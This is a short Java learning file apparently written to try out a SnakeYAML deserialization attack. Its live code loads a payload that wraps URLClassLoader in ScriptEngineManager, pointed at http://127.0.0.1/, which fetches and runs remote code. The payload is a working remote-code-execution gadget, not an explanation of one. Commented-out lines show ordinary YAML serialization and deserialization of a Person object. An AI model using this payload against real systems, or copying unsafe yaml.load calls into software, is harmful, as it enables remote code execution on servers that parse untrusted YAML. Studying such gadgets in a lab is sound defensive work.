package learn;

import org.yaml.snakeyaml.Yaml;

public class Test {
    public static void main(String[] args) {
        Yaml yaml = new Yaml();
        String payload = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1/\"]]]]\n";
        yaml.load(payload);
//        Person person = new Person();
//        person.setAge(18);
//        person.setName("Dem0");
//
//
//        System.out.println("=====序列化====");
//        String dump = yaml.dump(person);//序列化
//        System.out.println(person);
//        System.out.println(dump);
//
//
//        System.out.println("=====反序列化===");
//        System.out.println(yaml.load(dump));

    }
}
